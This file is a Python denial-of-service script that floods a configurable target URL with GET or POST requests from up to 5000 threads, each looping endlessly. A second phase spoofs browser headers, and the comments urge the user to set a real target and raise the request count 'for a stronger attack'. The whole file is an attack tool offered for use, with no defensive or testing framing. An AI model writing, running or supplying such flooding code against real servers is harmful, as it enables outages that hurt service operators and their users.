import requests
import random
import time
import threading

# Target URL
target_url = "http://target_server.com"  # Change this to your target server's URL

# Number of requests to be sent
num_requests = 5000  # Increase this number for a stronger attack

# Payload to be sent with POST requests (optional, can be customized)
payload = {
    'data': 'test_data',
    'action': 'attack'
}

# Function to simulate overload with GET requests
def overload_server_get():
    while True:
        try:
            # Simulate a GET request to the target URL
            response = requests.get(target_url, timeout=3)
            if response.status_code == 200:
                print(f"[+] Successfully sent a GET request to {target_url}")
            else:
                print(f"[-] GET request failed, Status Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"[!] Error in GET request: {str(e)}")

# Function to simulate overload with POST requests
def overload_server_post():
    while True:
        try:
            # Simulate a POST request with payload to the target URL
            response = requests.post(target_url, data=payload, timeout=3)
            if response.status_code == 200:
                print(f"[+] Successfully sent a POST request to {target_url}")
            else:
                print(f"[-] POST request failed, Status Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"[!] Error in POST request: {str(e)}")

# Function to simulate attack via multiple threads
def start_attack():
    print(f"[+] Starting server overload attack on {target_url}...\n")
    threads = []

    # Choose whether to perform GET or POST attack based on your preference
    attack_type = random.choice(['GET', 'POST'])

    for _ in range(num_requests):
        if attack_type == 'GET':
            thread = threading.Thread(target=overload_server_get)
        else:
            thread = threading.Thread(target=overload_server_post)

        threads.append(thread)
        thread.start()
        time.sleep(random.uniform(0.1, 0.5))  # Random delay between thread starts

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

# Enhanced attack strength via additional techniques (e.g., headers, randomizing)
def enhanced_attack():
    print(f"[+] Enhancing attack with random headers and payloads...\n")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
    }

    for _ in range(num_requests):
        try:
            # Send GET request with random headers for extra confusion
            response = requests.get(target_url, headers=headers, timeout=3)
            if response.status_code == 200:
                print(f"[+] Successfully sent a GET request with headers to {target_url}")
            else:
                print(f"[-] GET request with headers failed, Status Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"[!] Error in enhanced GET request: {str(e)}")

# Execute attack with overload and enhancement
def execute_attack():
    start_attack()  # Perform initial attack
    enhanced_attack()  # Add enhanced attack

# Main function
if __name__ == "__main__":
    execute_attack()
